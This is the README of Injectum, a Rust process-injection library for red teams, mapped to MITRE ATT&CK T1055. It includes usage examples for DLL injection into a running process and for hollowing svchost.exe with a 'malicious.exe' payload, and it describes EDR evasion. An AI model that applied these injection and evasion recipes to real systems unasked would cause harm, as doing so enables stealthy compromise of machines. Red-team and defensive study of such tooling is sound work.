<h1 align="center">Injectum</h1>

<p align="center">
<em>The modern, type-safe process injection framework for Red Teams and Offensive Security in Rust.</em>
</p>

<p align="center">
<a href="https://crates.io/crates/injectum">
<img src="https://img.shields.io/crates/v/injectum.svg" alt="Crates.io">
</a>
<a href="https://github.com/0x536b796ec3b578/injectum/blob/main/LICENSE">
<img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT Licensed">
</a>
</p>

<p align="center">
<a href="#architecture">Architecture</a> •
<a href="#how-it-works">How It Works</a> •
<a href="#installation">Installation</a> •
<a href="#build-instructions">Build</a> •
<a href="#roadmap---mitre-attck-process-injection-t1055">Roadmap</a> •
<a href="#contributing">Contributing</a>
</p>

## Overview
**Injectum** is a modular, type-safe Rust library for process injection in Rust. It abstracts away the headache of platform-specific implementations so you can focus on the strategy.

Think of it as the "Lego set" for offensive tradecraft: it provides a structured interface for executing various injection strategies (mapped to [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/) techniques) while handling memory allocation, permission juggling, and thread creation safely.

**Why Injectum**?
- 🛡️ OpSec-Conscious: We don't promise invisibility (nothing can), but we default to the stealthiest known patterns and minimize artifacts to give you the best fighting chance against modern EDRs.
- 🦀 Memory Safety: Built on Rust to prevent crashes in your loader, because a crashed loader is a detected loader.
- 🧩 Modular Architecture: Swap injection techniques (T1055.xxx) dynamically without rewriting your core logic.
- 🚀 Developer Experience: A fluent, type-safe Builder API that catches errors at compile time, not runtime.

## Architecture
The library is built around a unidirectional data flow: `Builder` $\to$ `Configuration` $\to$ `Factory` $\to$ `Execution`.

### 1. The Builder Pattern
The primary entry point is the `InjectorBuilder`. It provides a fluent interface to construct an immutable injection configuration, ensuring all components (Strategy, Payload, Target) are valid before execution.
- **Initialization**: `InjectorBuilder::new()` starts the chain.
- **Validation**: The `build()` method enforces the presence of a strategy and payload.
- **Execution**: The builder allows immediate execution via `.execute()`.

### 2. Payload & Metadata
Payloads are strongly typed via the `Payload` enum to prevent misuse.
- **Variants**: Supports `Shellcode`, `DllFile`, `Executable`, `Script`, and generic `Blob`.
- **Metadata**: Every payload includes `PayloadMetadata` for OpSec tracking (origin, description) and safety checks (e.g., `safe_sample` flag).

### 3. Target Abstraction 
The `Target` enum abstracts the destination context.
- **Pid**: Targets an existing remote process (`Target::Pid(u32)`).
- **Spawn**: Spawns a new process to act as the target (`Target::Spawn(PathBuf)`).
- **CurrentProcess**: Targets the injector itself (`Target::CurrentProcess`).

### 4. Strategy Factory
Strategies are instantiated at runtime based on the `StrategyType`.
- **Feature Gating**: Strategies are gated by Cargo features (e.g., `feature = "T1055_001"`) to minimize binary size.
- **Resolution**: The `Factory` matches the requested technique to its concrete implementation.

### 5. The Execution Engine
The `Injector` serves as the stateless runner.
- **Pre-flight Checks**: Validates compatibility (e.g., does the strategy require a PID?).
- **Error Propagation**: Returns `Result<(), Error>` for granular error handling.

## How It Works
Each technique has a more complete example associated with it in the `examples/` folder of the repository.

### Example 1: Classic DLL Injection (T1055.001)
This example targets an existing process ID.

```rust
use injectum::{
    InjectorBuilder, Payload, PayloadMetadata, Target, Technique,
    method::DynamicLinkLibrary
};
use std::path::PathBuf;

fn main() -> injectum::Result<()> {
    // 1. Define the payload
    let payload = Payload::DllFile {
        file_path: Some(PathBuf::from("C:\\temp\\payload.dll")),
        image_bytes: None,
        metadata: PayloadMetadata::default(),
    };

    // 2. Configure the technique
    let technique = Technique::T1055_001(DynamicLinkLibrary::Classic);

    // 3. Build and Execute targeting a PID
    InjectorBuilder::new()
        .target(Target::Pid(1234))
        .payload(payload)
        .technique(technique)
        .execute()?;

    Ok(())
}
```

### Example 2: Process Hollowing (T1055.012)
This example spawns a new process and replaces its memory.

```rust
use injectum::{
    InjectorBuilder, Payload, PayloadMetadata, Target, Technique,
    method::ProcessHollowing
};
use std::path::PathBuf;

fn main() -> injectum::Result<()> {
    // 1. Load payload (Auto-detects format)
    let payload = Payload::from_file(
        "C:\\temp\\malicious.exe",
        PayloadMetadata::default()
    )?;

    // 2. Configure the technique (Standard Hollowing)
    let technique = Technique::T1055_012(ProcessHollowing::Standard);

    // 3. Build and Execute targeting a new process
    InjectorBuilder::new()
        .target(Target::Spawn(PathBuf::from("C:\\Windows\\System32\\svchost.exe")))
        .payload(payload)
        .technique(technique)
        .execute()?;

    Ok(())
}
```

## Installation
Run the following Cargo command in your project directory:
```bash
cargo add injectum
```

Or add the following line to your `Cargo.toml`:
```toml
injectum = "0.2.0"
```

## Build Instructions

**Before building, please check the configuration file**:
1. Open `.cargo/config.toml`.
2. Windows Users: Comment out the `linker = "lld-link"` line.
3. Linux Users: Ensure `linker = "lld-link"` is uncommented.

### Native Windows
Requires the MSVC toolchain (Visual Studio Build Tools).
```powershell
cargo build --release
```

### Cross-Compilation from Linux
This library relies on the proprietary MSVC runtime libraries. The easiest way to compile from Linux is using [cargo-xwin](https://github.com/rust-cross/cargo-xwin).

1. Install `cargo-xwin`:
```bash
cargo install cargo-xwin
```

2. Build with the MSVC target:
```bash
cargo xwin build --example T1055_001_DLL_Injection --features "tracing,T1055_001" --release
```

## Roadmap - MITRE ATT&CK Process Injection (T1055)
Injectum aims to provide a modular, feature‑gated implementation of the full set of process‑injection techniques referenced in the [MITRE ATT&CK framework](https://attack.mitre.org/techniques/T1055/).

| ID | Technique Name |Implemented Methods | 
| :--- | :--- | :--- |
| [T1055.001](https://attack.mitre.org/techniques/T1055/001/) | Dynamic-link Library Injection | `Classic`, `Reflective` |
| [T1055.002](https://attack.mitre.org/techniques/T1055/002/) | Portable Executable Injection | `RemoteThread` |
| [T1055.003](https://attack.mitre.org/techniques/T1055/003/) | Thread Execution Hijacking | [ ] |
| [T1055.004](https://attack.mitre.org/techniques/T1055/004/) | Asynchronous Procedure Call | `Sniper`, `Spray`, `EarlyBird` |
| [T1055.005](https://attack.mitre.org/techniques/T1055/005/) | Thread Local Storage | [ ] |
| [T1055.008](https://attack.mitre.org/techniques/T1055/008/) | Ptrace System Calls | [ ] |
| [T1055.009](https://attack.mitre.org/techniques/T1055/009/) | Proc Memory | [ ] |
| [T1055.011](https://attack.mitre.org/techniques/T1055/011/) | Extra Window Memory Injection | [ ] |
| [T1055.012](https://attack.mitre.org/techniques/T1055/012/) | Process Hollowing | `Standard`, `EntryPointStomping` |
| [T1055.013](https://attack.mitre.org/techniques/T1055/013/) | Process Doppelgänging | [ ] |
| [T1055.014](https://attack.mitre.org/techniques/T1055/014/) | VDSO Hijacking | [ ] |
| [T1055.015](https://attack.mitre.org/techniques/T1055/015/) | ListPlanting | [ ] |

## Contributing
Contributions are welcome!
- Adding new injection strategies
- Writing comprehensive tests
- Benchmarking performance

Ensure your code is properly formatted:
```bash
cargo fmt
cargo clippy
```

## Supporting
Author: *Skynõx*

If you'd like to support the project, you can donate via the following addresses:
| Bitcoin  | bc1q87r2z8szxwqt538edzw5gl397c9v3hzxwjw82h |
| :------- | :----------------------------------------- |
| Ethereum | 0xe277049067F72E89326c2C0D11333531d5BbB78B |
